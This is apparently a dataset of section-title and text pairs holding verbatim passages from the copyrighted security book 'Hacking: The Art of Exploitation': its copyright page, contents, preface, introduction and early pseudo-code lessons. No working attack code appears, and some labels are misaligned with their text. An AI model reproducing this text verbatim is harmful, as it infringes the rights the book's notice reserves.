[
  {
    "input": "Copyright",
    "output": "HACKING: THE ART OF EXPLOITATION, 2ND EDITION. Copyright © 2008 by Jon Erickson.\nAll rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, electronic or\nmechanical, including photocopying, recording, or by any information storage or retrieval system, without the prior\nwritten permission of the copyright owner and the publisher.\nPrinted on recycled paper in the United States of America\n11 10 09 08 07 1 2 3 4 5 6 7 8 9\nISBN-10: 1-59327-144-1\nISBN-13: 978-1-59327-144-2\nPublisher: William Pollock\nProduction Editors: Christina Samuell and Megan Dunchak\nCover Design: Octopod Studios\nDevelopmental Editor: Tyler Ortman\nTechnical Reviewer: Aaron Adams\nCopyeditors: Dmitry Kirsanov and Megan Dunchak\nCompositors: Christina Samuell and Kathleen Mish\nProofreader: Jim Brook\nIndexer: Nancy Guenther\nFor information on book distributors or translations, please contact No Starch Press, Inc. directly:\nNo Starch Press, Inc.\n555 De Haro Street, Suite 250, San Francisco, CA 94107\nphone: 415.863.9900; fax: 415.863.9950; info@nostarch.com; www.nostarch.com\nLibrary of Congress Cataloging-in-Publication Data\nErickson, Jon, 1977-\nHacking : the art of exploitation / Jon Erickson. -- 2nd ed.\np. cm.\nISBN-13: 978-1-59327-144-2\nISBN-10: 1-59327-144-1\n1. Computer security. 2. Computer hackers. 3. Computer networks--Security measures. I. Title.\nQA76.9.A25E75 2008\n005.8--dc22\n2007042910\nNo Starch Press and the No Starch Press logo are registered trademarks of No Starch Press, Inc. Other product and\ncompany names mentioned herein may be the trademarks of their respective owners. Rather than use a trademark\nsymbol with every occurrence of a trademarked name, we are using the names only in an editorial fashion and to the\nbenefit of the trademark owner, with no intention of infringement of the trademark.\nThe information in this book is distributed on an “As Is” basis, without warranty. While every precaution has been\ntaken in the preparation of this work, neither the author nor No Starch Press, Inc. shall have any liability to any\nperson or entity with respect to any loss or damage caused or alleged to be caused directly or indirectly by the\ninformation contained in it.\nB R I E F C O N T E N T S\nPreface.........................................................................................................................xi\nAcknowledgments.........................................................................................................xii\n0x100 Introduction.......................................................................................................1\n0x200 Programming.....................................................................................................5\n0x300 Exploitation...................................................................................................115\n0x400 Networking...................................................................................................195\n0x500 Shellcode......................................................................................................281\n0x600 Countermeasures............................................................................................319\n0x700 Cryptology....................................................................................................393\n0x800 Conclusion....................................................................................................451\nIndex.........................................................................................................................455\nC O N T E N T S I N D E T A I L\nPREFACE xi\nACKNOWLEDGMENTS xii\n0x100 INTRODUCTION 1\n0x200 PROGRAMMING 5\n0x210 What Is Programming?.................................................................................6\n0x220 Pseudo-code................................................................................................7\n0x230 Control Structures.........................................................................................8\n0x231 If-Then-Else......................................................................................8\n0x232 While/Until Loops...........................................................................9\n0x233 For Loops.....................................................................................10\n0x240 More Fundamental Programming Concepts...................................................11\n0x241 Variables.....................................................................................11\n0x242 Arithmetic Operators.....................................................................12\n0x243 Comparison Operators..................................................................14\n0x244 Functions......................................................................................16\n0x250 Getting Your Hands Dirty............................................................................19\n0x251 The Bigger Picture.........................................................................20\n0x252 The x86 Processor.........................................................................23\n0x253 Assembly Language.......................................................................25\n0x260 Back to Basics............................................................................................37\n0x261 Strings.........................................................................................38\n0x262 Signed, Unsigned, Long, and Short.................................................41\n0x263 Pointers........................................................................................43\n0x264 Format Strings...............................................................................48\n0x265 Typecasting..................................................................................51\n0x266 Command-Line Arguments..............................................................58\n0x267 Variable Scoping..........................................................................62\n0x270 Memory Segmentation................................................................................69\n0x271 Memory Segments in C..................................................................75\n0x272 Using the Heap.............................................................................77\n0x273 Error-Checked malloc()...................................................................80\n0x280 Building on Basics......................................................................................81\n0x281 File Access...................................................................................81\n0x282 File Permissions.............................................................................87\n0x283 User IDs.......................................................................................88\n0x284 Structs..........................................................................................96\n0x285 Function Pointers.........................................................................100\n0x286 Pseudo-random Numbers.............................................................101\n0x287 A Game of Chance.....................................................................102\n0x300 EXPLOITATION 115\n0x310 Generalized Exploit Techniques.................................................................118\n0x320 Buffer Overflows......................................................................................119\n0x321 Stack-Based Buffer Overflow Vulnerabilities....................................122\n0x330 Experimenting with BASH..........................................................................133\n0x331 Using the Environment..................................................................142\n0x340 Overflows in Other Segments....................................................................150\n0x341 A Basic Heap-Based Overflow......................................................150\n0x342 Overflowing Function Pointers.......................................................156\n0x350 Format Strings..........................................................................................167\n0x351 Format Parameters.......................................................................167\n0x352 The Format String Vulnerability......................................................170\n0x353 Reading from Arbitrary Memory Addresses....................................172\n0x354 Writing to Arbitrary Memory Addresses.........................................173\n0x355 Direct Parameter Access...............................................................180\n0x356 Using Short Writes......................................................................182\n0x357 Detours with .dtors.......................................................................184\n0x358 Another notesearch Vulnerability...................................................189\n0x359 Overwriting the Global Offset Table..............................................190\n0x400 NETWORKING 195\n0x410 OSI Model..............................................................................................196\n0x420 Sockets...................................................................................................198\n0x421 Socket Functions..........................................................................199\n0x422 Socket Addresses........................................................................200\n0x423 Network Byte Order....................................................................202\n0x424 Internet Address Conversion.........................................................203\n0x425 A Simple Server Example.............................................................203\n0x426 A Web Client Example................................................................207\n0x427 A Tinyweb Server........................................................................213\n0x430 Peeling Back the Lower Layers....................................................................217\n0x431 Data-Link Layer............................................................................218\n0x432 Network Layer............................................................................220\n0x433 Transport Layer...........................................................................221\n0x440 Network Sniffing......................................................................................224\n0x441 Raw Socket Sniffer.......................................................................226\n0x442 libpcap Sniffer............................................................................228\n0x443 Decoding the Layers....................................................................230\n0x444 Active Sniffing.............................................................................239\n0x450 Denial of Service......................................................................................251\n0x451 SYN Flooding.............................................................................252\n0x452 The Ping of Death........................................................................256\n0x453 Teardrop....................................................................................256\n0x454 Ping Flooding.............................................................................257\n0x455 Amplification Attacks...................................................................257\n0x456 Distributed DoS Flooding..............................................................258\n0x460 TCP/IP Hijacking......................................................................................258\n0x461 RST Hijacking.............................................................................259\n0x462 Continued Hijacking....................................................................263\nviii Contents in Detail\n0x470 Port Scanning..........................................................................................264\n0x471 Stealth SYN Scan........................................................................264\n0x472 FIN, X-mas, and Null Scans..........................................................264\n0x473 Spoofing Decoys.........................................................................265\n0x474 Idle Scanning..............................................................................265\n0x475 Proactive Defense (shroud)............................................................267\n0x480 Reach Out and Hack Someone..................................................................272\n0x481 Analysis with GDB.......................................................................273\n0x482 Almost Only Counts with Hand Grenades......................................275\n0x483 Port-Binding Shellcode.................................................................278\n0x500 SHELLCODE 281\n0x510 Assembly vs. C........................................................................................282\n0x511 Linux System Calls in Assembly.....................................................284\n0x520 The Path to Shellcode................................................................................286\n0x521 Assembly Instructions Using the Stack............................................287\n0x522 Investigating with GDB.................................................................289\n0x523 Removing Null Bytes....................................................................290\n0x530 Shell-Spawning Shellcode..........................................................................295\n0x531 A Matter of Privilege....................................................................299\n0x532 And Smaller Still..........................................................................302\n0x540 Port-Binding Shellcode..............................................................................303\n0x541 Duplicating Standard File Descriptors.............................................307\n0x542 Branching Control Structures.........................................................309\n0x550 Connect-Back Shellcode............................................................................314\n0x600 COUNTERMEASURES 319\n0x610 Countermeasures That Detect.....................................................................320\n0x620 System Daemons......................................................................................321\n0x621 Crash Course in Signals...............................................................322\n0x622 Tinyweb Daemon........................................................................324\n0x630 Tools of the Trade.....................................................................................328\n0x631 tinywebd Exploit Tool...................................................................329\n0x640 Log Files..................................................................................................334\n0x641 Blend In with the Crowd...............................................................334\n0x650 Overlooking the Obvious..........................................................................336\n0x651 One Step at a Time.....................................................................336\n0x652 Putting Things Back Together Again...............................................340\n0x653 Child Laborers............................................................................346\n0x660 Advanced Camouflage.............................................................................348\n0x661 Spoofing the Logged IP Address....................................................348\n0x662 Logless Exploitation.....................................................................352\n0x670 The Whole Infrastructure...........................................................................354\n0x671 Socket Reuse ..............................................................................355\n0x680 Payload Smuggling..................................................................................359\n0x681 String Encoding ..........................................................................359\n0x682 How to Hide a Sled.....................................................................362\n0x690 Buffer Restrictions.....................................................................................363\n0x691 Polymorphic Printable ASCII Shellcode...........................................366\nContents in Detail ix\n0x6a0 Hardening Countermeasures......................................................................376\n0x6b0 Nonexecutable Stack................................................................................376\n0x6b1 ret2libc......................................................................................376\n0x6b2 Returning into system()..................................................................377\n0x6c0 Randomized Stack Space..........................................................................379\n0x6c1 Investigations with BASH and GDB................................................380\n0x6c2 Bouncing Off linux-gate................................................................384\n0x6c3 Applied Knowledge.....................................................................388\n0x6c4 A First Attempt.............................................................................388\n0x6c5 Playing the Odds.........................................................................390\n0x700 CRYPTOLOGY 393\n0x710 Information Theory...................................................................................394\n0x711 Unconditional Security.................................................................394\n0x712 One-Time Pads............................................................................395\n0x713 Quantum Key Distribution.............................................................395\n0x714 Computational Security................................................................396\n0x720 Algorithmic Run Time................................................................................397\n0x721 Asymptotic Notation....................................................................398\n0x730 Symmetric Encryption................................................................................398\n0x731 Lov Grover’s Quantum Search Algorithm........................................399\n0x740 Asymmetric Encryption..............................................................................400\n0x741 RSA...........................................................................................400\n0x742 Peter Shor’s Quantum Factoring Algorithm .....................................404\n0x750 Hybrid Ciphers........................................................................................406\n0x751 Man-in-the-Middle Attacks............................................................406\n0x752 Differing SSH Protocol Host Fingerprints.........................................410\n0x753 Fuzzy Fingerprints.......................................................................413\n0x760 Password Cracking...................................................................................418\n0x761 Dictionary Attacks.......................................................................419\n0x762 Exhaustive Brute-Force Attacks.......................................................422\n0x763 Hash Lookup Table......................................................................423\n0x764 Password Probability Matrix.........................................................424\n0x770 Wireless 802.11b Encryption....................................................................433\n0x771 Wired Equivalent Privacy.............................................................434\n0x772 RC4 Stream Cipher.....................................................................435\n0x780 WEP Attacks............................................................................................436\n0x781 Offline Brute-Force Attacks............................................................436\n0x782 Keystream Reuse.........................................................................437\n0x783 IV-Based Decryption Dictionary Tables...........................................438\n0x784 IP Redirection..............................................................................438\n0x785 Fluhrer, Mantin, and Shamir Attack...............................................439\n0x800 CONCLUSION 451\n0x810 References...............................................................................................452\n0x820 Sources...................................................................................................454\nINDEX 455\nx Contents in Detail"
  },
  {
    "input": "Preface",
    "output": "P R E F A C E\nThe goal of this book is to share the art of hacking\nwith everyone. Understanding hacking techniques\nis often difficult, since it requires both breadth and\ndepth of knowledge. Many hacking texts seem esoteric\nand confusing because of just a few gaps in this prerequisite education. This\nsecond edition of Hacking: The Art of Exploitation makes the world of hacking\nmore accessible by providing the complete picture—from programming to\nmachine code to exploitation. In addition, this edition features a bootable\nLiveCD based on Ubuntu Linux that can be used in any computer with\nanx86 processor, without modifying the computer’s existing OS. This CD\ncontains all the source code in the book and provides a development and\nexploitation environment you can use to follow along with the book’s\nexamples and experiment along the way."
  },
  {
    "input": "Acknowledgments",
    "output": "A C K N O W L E D G M E N T S\nI would like to thank Bill Pollock and everyone else at\nNo Starch Press for making this book a possibility and\nallowing me to have so much creative control in the\nprocess. Also, I would like to thank my friends Seth Benson and Aaron Adams\nfor proofreading and editing, Jack Matheson for helping me with assembly,\nDr. Seidel for keeping me interested in the science of computer science, my\nparents for buying that first Commodore VIC-20, and the hacker community\nfor the innovation and creativity that produced the techniques explained in\nthis book."
  },
  {
    "input": "0x100: Introduction",
    "output": "0x100\nI N T R O D U C T I O N\nThe idea of hacking may conjure stylized images of\nelectronic vandalism, espionage, dyed hair, and body\npiercings. Most people associate hacking with breaking\nthe law and assume that everyone who engages in hack-\ning activities is a criminal. Granted, there are people out\nthere who use hacking techniques to break the law, but hacking isn’t really\nabout that. In fact, hacking is more about following the law than breaking it.\nThe essence of hacking is finding unintended or overlooked uses for the\nlaws and properties of a given situation and then applying them in new and\ninventive ways to solve a problem—whatever it may be.\nThe following math problem illustrates the essence of hacking:\nUse each of the numbers 1, 3, 4, and 6 exactly once with any\nofthe four basic math operations (addition, subtraction,\nmultiplication, and division) to total 24. Each number must be\nused once and only once, and you may define the order of\noperations; for example, 3 * (4 + 6) + 1 = 31 is valid, however\nincorrect, since it doesn’t total 24.\nThe rules for this problem are well defined and simple, yet the answer\neludes many. Like the solution to this problem (shown on the last page of\nthis book), hacked solutions follow the rules of the system, but they use those\nrules in counterintuitive ways. This gives hackers their edge, allowing them to\nsolve problems in ways unimaginable for those confined to conventional\nthinking and methodologies.\nSince the infancy of computers, hackers have been creatively solving\nproblems. In the late 1950s, the MIT model railroad club was given a dona-\ntion of parts, mostly old telephone equipment. The club’s members used this\nequipment to rig up a complex system that allowed multiple operators to con-\ntrol different parts of the track by dialing in to the appropriate sections. They\ncalled this new and inventive use of telephone equipment hacking; many\npeople consider this group to be the original hackers. The group moved on\nto programming on punch cards and ticker tape for early computers like the\nIBM 704 and the TX-0. While others were content with writing programs that\njust solved problems, the early hackers were obsessed with writing programs\nthat solved problems well. A new program that could achieve the same result\nas an existing one but used fewer punch cards was considered better, even\nthough it did the same thing. The key difference was how the program\nachieved its results—elegance.\nBeing able to reduce the number of punch cards needed for a program\nshowed an artistic mastery over the computer. A nicely crafted table can hold\na vase just as well as a milk crate can, but one sure looks a lot better than the\nother. Early hackers proved that technical problems can have artistic solu-\ntions, and they thereby transformed programming from a mere engineering\ntask into an art form.\nLike many other forms of art, hacking was often misunderstood. The few\nwho got it formed an informal subculture that remained intensely focused\non learning and mastering their art. They believed that information should\nbe free and anything that stood in the way of that freedom should be circum-\nvented. Such obstructions included authority figures, the bureaucracy of\ncollege classes, and discrimination. In a sea of graduation-driven students,\nthis unofficial group of hackers defied conventional goals and instead pursued\nknowledge itself. This drive to continually learn and explore transcended\neven the conventional boundaries drawn by discrimination, evident in the\nMIT model railroad club’s acceptance of 12-year-old Peter Deutsch when\nhe demonstrated his knowledge of the TX-0 and his desire to learn. Age,\nrace, gender, appearance, academic degrees, and social status were not\nprimary criteria for judging another’s worth—not because of a desire for\nequality, but because of a desire to advance the emerging art of hacking.\nThe original hackers found splendor and elegance in the conventionally\ndry sciences of math and electronics. They saw programming as a form of\nartistic expression and the computer as an instrument of that art. Their desire\nto dissect and understand wasn’t intended to demystify artistic endeavors; it\nwas simply a way to achieve a greater appreciation of them. These knowledge-\ndriven values would eventually be called the Hacker Ethic: the appreciation\nof logic as an art form and the promotion of the free flow of information,\nsurmounting conventional boundaries and restrictions for the simple goal of\n2 0x100\nbetter understanding the world. This is not a new cultural trend; the\nPythagoreans in ancient Greece had a similar ethic and subculture, despite\nnot owning computers. They saw beauty in mathematics and discovered many\ncore concepts in geometry. That thirst for knowledge and its beneficial by-\nproducts would continue on through history, from the Pythagoreans to Ada\nLovelace to Alan Turing to the hackers of the MIT model railroad club.\nModern hackers like Richard Stallman and Steve Wozniak have continued\nthe hacking legacy, bringing us modern operating systems, programming\nlanguages, personal computers, and many other technologies that we use\nevery day.\nHow does one distinguish between the good hackers who bring us the\nwonders of technological advancement and the evil hackers who steal our\ncredit card numbers? The term cracker was coined to distinguish evil hackers\nfrom the good ones. Journalists were told that crackers were supposed to be\nthe bad guys, while hackers were the good guys. Hackers stayed true to the\nHacker Ethic, while crackers were only interested in breaking the law and\nmaking a quick buck. Crackers were considered to be much less talented\nthan the elite hackers, as they simply made use of hacker-written tools and\nscripts without understanding how they worked. Cracker was meant to be the\ncatch-all label for anyone doing anything unscrupulous with a computer—\npirating software, defacing websites, and worst of all, not understanding what\nthey were doing. But very few people use this term today.\nThe term’s lack of popularity might be due to its confusing etymology—\ncracker originally described those who crack software copyrights and reverse\nengineer copy-protection schemes. Its current unpopularity might simply\nresult from its two ambiguous new definitions: a group of people who engage\nin illegal activity with computers or people who are relatively unskilled hackers.\nFew technology journalists feel compelled to use terms that most of their\nreaders are unfamiliar with. In contrast, most people are aware of the mystery\nand skill associated with the term hacker, so for a journalist, the decision to\nuse the term hacker is easy. Similarly, the term script kiddie is sometimes used\nto refer to crackers, but it just doesn’t have the same zing as the shadowy\nhacker. There are some who will still argue that there is a distinct line between\nhackers and crackers, but I believe that anyone who has the hacker spirit is a\nhacker, despite any laws he or she may break.\nThe current laws restricting cryptography and cryptographic research\nfurther blur the line between hackers and crackers. In 2001, Professor Edward\nFelten and his research team from Princeton University were about to publish\na paper that discussed the weaknesses of various digital watermarking schemes.\nThis paper responded to a challenge issued by the Secure Digital Music\nInitiative (SDMI) in the SDMI Public Challenge, which encouraged the\npublic to attempt to break these watermarking schemes. Before Felten and\nhis team could publish the paper, though, they were threatened by both the\nSDMI Foundation and the Recording Industry Association of America (RIAA).\nThe Digital Millennium Copyright Act (DCMA) of 1998 makes it illegal to\ndiscuss or provide technology that might be used to bypass industry con-\nsumer controls. This same law was used against Dmitry Sklyarov, a Russian\ncomputer programmer and hacker. He had written software to circumvent\nIntroduction 3\noverly simplistic encryption in Adobe software and presented his findings at a\nhacker convention in the United States. The FBI swooped in and arrested\nhim, leading to a lengthy legal battle. Under the law, the complexity of the\nindustry consumer controls doesn’t matter—it would be technically illegal to\nreverse engineer or even discuss Pig Latin if it were used as an industry con-\nsumer control. Who are the hackers and who are the crackers now? When\nlaws seem to interfere with free speech, do the good guys who speak their\nminds suddenly become bad? I believe that the spirit of the hacker transcends\ngovernmental laws, as opposed to being defined by them.\nThe sciences of nuclear physics and biochemistry can be used to kill,\nyet they also provide us with significant scientific advancement and modern\nmedicine. There’s nothing good or bad about knowledge itself; morality lies\nin the application of knowledge. Even if we wanted to, we couldn’t suppress\nthe knowledge of how to convert matter into energy or stop the continued\ntechnological progress of society. In the same way, the hacker spirit can\nnever be stopped, nor can it be easily categorized or dissected. Hackers will\nconstantly be pushing the limits of knowledge and acceptable behavior,\nforcing us to explore further and further.\nPart of this drive results in an ultimately beneficial co-evolution of\nsecurity through competition between attacking hackers and defending\nhackers. Just as the speedy gazelle adapted from being chased by the cheetah,\nand the cheetah became even faster from chasing the gazelle, the competi-\ntion between hackers provides computer users with better and stronger\nsecurity, as well as more complex and sophisticated attack techniques. The\nintroduction and progression of intrusion detection systems (IDSs) is a prime\nexample of this co-evolutionary process. The defending hackers create IDSs\nto add to their arsenal, while the attacking hackers develop IDS-evasion\ntechniques, which are eventually compensated for in bigger and better IDS\nproducts. The net result of this interaction is positive, as it produces smarter\npeople, improved security, more stable software, inventive problem-solving\ntechniques, and even a new economy.\nThe intent of this book is to teach you about the true spirit of hacking.\nWe will look at various hacker techniques, from the past to the present,\ndissecting them to learn how and why they work. Included with this book is\nabootable LiveCD containing all the source code used herein as well as a\npreconfigured Linux environment. Exploration and innovation are critical\nto the art of hacking, so this CD will let you follow along and experiment on\nyour own. The only requirement is an x86 processor, which is used by all\nMicrosoft Windows machines and the newer Macintosh computers—just\ninsert the CD and reboot. This alternate Linux environment will not disturb\nyour existing OS, so when you’re done, just reboot again and remove the CD.\nThis way, you will gain a hands-on understanding and appreciation for hacking\nthat may inspire you to improve upon existing techniques or even to invent\nnew ones. Hopefully, this book will stimulate the curious hacker nature in you\nand prompt you to contribute to the art of hacking in some way, regardless of\nwhich side of the fence you choose to be on.\n4 0x100"
  },
  {
    "input": "0x200: Programming",
    "output": "0x200\nP R O G R A M M I N G\nHacker is a term for both those who write code and\nthose who exploit it. Even though these two groups of\nhackers have different end goals, both groups use similar\nproblem-solving techniques. Since an understanding\nof programming helps those who exploit, and an under-\nstanding of exploitation helps those who program, many\nhackers do both. There are interesting hacks found in both the techniques\nused to write elegant code and the techniques used to exploit programs.\nHacking is really just the act of finding a clever and counterintuitive\nsolution to a problem.\nThe hacks found in program exploits usually use the rules of the\ncomputer to bypass security in ways never intended. Programming hacks are\nsimilar in that they also use the rules of the computer in new and inventive\nways, but the final goal is efficiency or smaller source code, not necessarily a\nsecurity compromise. There are actually an infinite number of programs that"
  },
  {
    "input": "0x210 What Is Programming?",
    "output": "can be written to accomplish any given task, but most of these solutions are\nunnecessarily large, complex, and sloppy. The few solutions that remain\nare small, efficient, and neat. Programs that have these qualities are said to\nhave elegance, and the clever and inventive solutions that tend to lead to\nthis efficiency are called hacks. Hackers on both sides of programming\nappreciate both the beauty of elegant code and the ingenuity of clever hacks.\nIn the business world, more importance is placed on churning out func-\ntional code than on achieving clever hacks and elegance. Because of the\ntremendous exponential growth of computational power and memory,\nspending an extra five hours to create a slightly faster and more memory-\nefficient piece of code just doesn’t make business sense when dealing with\nmodern computers that have gigahertz of processing cycles and gigabytes of\nmemory. While time and memory optimizations go without notice by all but\nthe most sophisticated of users, a new feature is marketable. When the\nbottom line is money, spending time on clever hacks for optimization just\ndoesn’t make sense.\nTrue appreciation of programming elegance is left for the hackers:\ncomputer hobbyists whose end goal isn’t to make a profit but to squeeze\nevery possible bit of functionality out of their old Commodore 64s, exploit\nwriters who need to write tiny and amazing pieces of code to slip through\nnarrow security cracks, and anyone else who appreciates the pursuit and the\nchallenge of finding the best possible solution. These are the people who get\nexcited about programming and really appreciate the beauty of an elegant\npiece of code or the ingenuity of a clever hack. Since an understanding of\nprogramming is a prerequisite to understanding how programs can be\nexploited, programming is a natural starting point.\n0x210 What Is Programming?\nProgramming is a very natural and intuitive concept. A program is nothing\nmore than a series of statements written in a specific language. Programs are\neverywhere, and even the technophobes of the world use programs every day.\nDriving directions, cooking recipes, football plays, and DNA are all types of\nprograms. A typical program for driving directions might look something\nlike this:\nStart out down Main Street headed east. Continue on Main Street until you see\na church on your right. If the street is blocked because of construction, turn\nright there at 15th Street, turn left on Pine Street, and then turn right on\n16th Street. Otherwise, you can just continue and make a right on 16th Street.\nContinue on 16th Street, and turn left onto Destination Road. Drive straight\ndown Destination Road for 5 miles, and then you'll see the house on the right.\nThe address is 743 Destination Road.\nAnyone who knows English can understand and follow these driving\ndirections, since they’re written in English. Granted, they’re not eloquent,\nbut each instruction is clear and easy to understand, at least for someone\nwho reads English.\n6 0x200"
  },
  {
    "input": "0x220 Pseudo-code",
    "output": "But a computer doesn’t natively understand English; it only understands\nmachine language. To instruct a computer to do something, the instructions\nmust be written in its language. However, machine language is arcane and\ndifficult to work with—it consists of raw bits and bytes, and it differs from\narchitecture to architecture. To write a program in machine language for an\nIntel x86 processor, you would have to figure out the value associated with\neach instruction, how each instruction interacts, and myriad low-level details.\nProgramming like this is painstaking and cumbersome, and it is certainly not\nintuitive.\nWhat’s needed to overcome the complication of writing machine language\nis a translator. An assembler is one form of machine-language translator—it is\na program that translates assembly language into machine-readable code.\nAssembly language is less cryptic than machine language, since it uses names\nfor the different instructions and variables, instead of just using numbers.\nHowever, assembly language is still far from intuitive. The instruction names\nare very esoteric, and the language is architecture specific. Just as machine\nlanguage for Intel x86 processors is different from machine language for\nSparc processors, x86 assembly language is different from Sparc assembly\nlanguage. Any program written using assembly language for one processor’s\narchitecture will not work on another processor’s architecture. If a program\nis written in x86 assembly language, it must be rewritten to run on Sparc\narchitecture. In addition, in order to write an effective program in assembly\nlanguage, you must still know many low-level details of the processor archi-\ntecture you are writing for.\nThese problems can be mitigated by yet another form of translator called\na compiler. A compiler converts a high-level language into machine language.\nHigh-level languages are much more intuitive than assembly language and\ncan be converted into many different types of machine language for differ-\nent processor architectures. This means that if a program is written in a high-\nlevel language, the program only needs to be written once; the same piece of\nprogram code can be compiled into machine language for various specific\narchitectures. C, C++, and Fortran are all examples of high-level languages.\nA program written in a high-level language is much more readable and\nEnglish-like than assembly language or machine language, but it still must\nfollow very strict rules about how the instructions are worded, or the com-\npiler won’t be able to understand it.\n0x220 Pseudo-code\nProgrammers have yet another form of programming language called\npseudo-code. Pseudo-code is simply English arranged with a general structure\nsimilar to a high-level language. It isn’t understood by compilers, assemblers,\nor any computers, but it is a useful way for a programmer to arrange instruc-\ntions. Pseudo-code isn’t well defined; in fact, most people write pseudo-code\nslightly differently. It’s sort of the nebulous missing link between English and\nhigh-level programming languages like C. Pseudo-code makes for an excel-\nlent introduction to common universal programming concepts.\nProgramming 7"
  },
  {
    "input": "0x231 If-Then-Else",
    "output": "0x230 Control Structures\nWithout control structures, a program would just be a series of instructions\nexecuted in sequential order. This is fine for very simple programs, but most\nprograms, like the driving directions example, aren’t that simple. The driv-\ning directions included statements like, Continue on Main Street until you see a\nchurch on your right and If the street is blocked because of construction. . . . These\nstatements are known as control structures, and they change the flow of the\nprogram’s execution from a simple sequential order to a more complex and\nmore useful flow.\n0x231 If-Then-Else\nIn the case of our driving directions, Main Street could be under construction.\nIf it is, a special set of instructions needs to address that situation. Otherwise,\nthe original set of instructions should be followed. These types of special cases\ncan be accounted for in a program with one of the most natural control\nstructures: the if-then-else structure. In general, it looks something like this:\nIf (condition) then\n{\nSet of instructions to execute if the condition is met;\n}\nElse\n{\nSet of instruction to execute if the condition is not met;\n}\nFor this book, a C-like pseudo-code will be used, so every instruction will\nend with a semicolon, and the sets of instructions will be grouped with curly\nbraces and indentation. The if-then-else pseudo-code structure of the pre-\nceding driving directions might look something like this:\nDrive down Main Street;\nIf (street is blocked)\n{\nTurn right on 15th Street;\nTurn left on Pine Street;\nTurn right on 16th Street;\n}\nElse\n{\nTurn right on 16th Street;\n}\nEach instruction is on its own line, and the various sets of conditional\ninstructions are grouped between curly braces and indented for readability.\nIn C and many other programming languages, the then keyword is implied and\ntherefore left out, so it has also been omitted in the preceding pseudo-code.\n8 0x200"
  },
  {
    "input": "0x232 While/Until Loops",
    "output": "Of course, other languages require the then keyword in their syntax—\nBASIC, Fortran, and even Pascal, for example. These types of syntactical\ndifferences in programming languages are only skin deep; the underlying\nstructure is still the same. Once a programmer understands the concepts\nthese languages are trying to convey, learning the various syntactical vari-\nations is fairly trivial. Since C will be used in the later sections, the pseudo-\ncode used in this book will follow a C-like syntax, but remember that\npseudo-code can take on many forms.\nAnother common rule of C-like syntax is when a set of instructions\nbounded by curly braces consists of just one instruction, the curly braces are\noptional. For the sake of readability, it’s still a good idea to indent these\ninstructions, but it’s not syntactically necessary. The driving directions from\nbefore can be rewritten following this rule to produce an equivalent piece of\npseudo-code:\nDrive down Main Street;\nIf (street is blocked)\n{\nTurn right on 15th Street;\nTurn left on Pine Street;\nTurn right on 16th Street;\n}\nElse\nTurn right on 16th Street;\nThis rule about sets of instructions holds true for all of the control\nstructures mentioned in this book, and the rule itself can be described in\npseudo-code.\nIf (there is only one instruction in a set of instructions)\nThe use of curly braces to group the instructions is optional;\nElse\n{\nThe use of curly braces is necessary;\nSince there must be a logical way to group these instructions;\n}\nEven the description of a syntax itself can be thought of as a simple\nprogram. There are variations of if-then-else, such as select/case statements,\nbut the logic is still basically the same: If this happens do these things, otherwise\ndo these other things (which could consist of even more if-then statements).\n0x232 While/Until Loops\nAnother elementary programming concept is the while control structure,\nwhich is a type of loop. A programmer will often want to execute a set of\ninstructions more than once. A program can accomplish this task through\nlooping, but it requires a set of conditions that tells it when to stop looping,\nProgramming 9"
  },
  {
    "input": "0x233 For Loops",
    "output": "lest it continue into infinity. A while loop says to execute the following set of\ninstructions in a loop while a condition is true. A simple program for a hungry\nmouse could look something like this:\nWhile (you are hungry)\n{\nFind some food;\nEat the food;\n}\nThe set of two instructions following the while statement will be repeated\nwhile the mouse is still hungry. The amount of food the mouse finds each\ntime could range from a tiny crumb to an entire loaf of bread. Similarly, the\nnumber of times the set of instructions in the while statement is executed\nchanges depending on how much food the mouse finds.\nAnother variation on the while loop is an until loop, a syntax that is\navailable in the programming language Perl (C doesn’t use this syntax). An\nuntil loop is simply a while loop with the conditional statement inverted. The\nsame mouse program using an until loop would be:\nUntil (you are not hungry)\n{\nFind some food;\nEat the food;\n}\nLogically, any until-like statement can be converted into a while loop.\nThe driving directions from before contained the statement Continue on\nMain Street until you see a church on your right. This can easily be changed into a\nstandard while loop by simply inverting the condition.\nWhile (there is not a church on the right)\nDrive down Main Street;\n0x233 For Loops\nAnother looping control structure is the for loop. This is generally used when\na programmer wants to loop for a certain number of iterations. The driving\ndirection Drive straight down Destination Road for 5 miles could be converted to\na for loop that looks something like this:\nFor (5 iterations)\nDrive straight for 1 mile;\nIn reality, a for loop is just a while loop with a counter. The same state-\nment can be written as such:\nSet the counter to 0;\nWhile (the counter is less than 5)\n10 0x200"
  },
  {
    "input": "0x241 Variables",
    "output": "{\nDrive straight for 1 mile;\nAdd 1 to the counter;\n}\nThe C-like pseudo-code syntax of a for loop makes this even more\napparent:\nFor (i=0; i<5; i++)\nDrive straight for 1 mile;\nIn this case, the counter is called i, and the for statement is broken up\ninto three sections, separated by semicolons. The first section declares the\ncounter and sets it to its initial value, in this case 0. The second section is like\na while statement using the counter: While the counter meets this condition,\nkeep looping. The third and final section describes what action should be\ntaken on the counter during each iteration. In this case, i++ is a shorthand\nway of saying, Add 1 to the counter called i.\nUsing all of the control structures, the driving directions from page 6\ncan be converted into a C-like pseudo-code that looks something like this:\nBegin going East on Main Street;\nWhile (there is not a church on the right)\nDrive down Main Street;\nIf (street is blocked)\n{\nTurn right on 15th Street;\nTurn left on Pine Street;\nTurn right on 16th Street;\n}\nElse\nTurn right on 16th Street;\nTurn left on Destination Road;\nFor (i=0; i<5; i++)\nDrive straight for 1 mile;\nStop at 743 Destination Road;\n0x240 More Fundamental Programming Concepts\nIn the following sections, more universal programming concepts will be\nintroduced. These concepts are used in many programming languages, with\na few syntactical differences. As I introduce these concepts, I will integrate\nthem into pseudo-code examples using C-like syntax. By the end, the pseudo-\ncode should look very similar to C code.\n0x241 Variables\nThe counter used in the for loop is actually a type of variable. A variable can\nsimply be thought of as an object that holds data that can be changed—\nhence the name. There are also variables that don’t change, which are aptly\nProgramming 11"
  },
  {
    "input": "0x242 Arithmetic Operators",
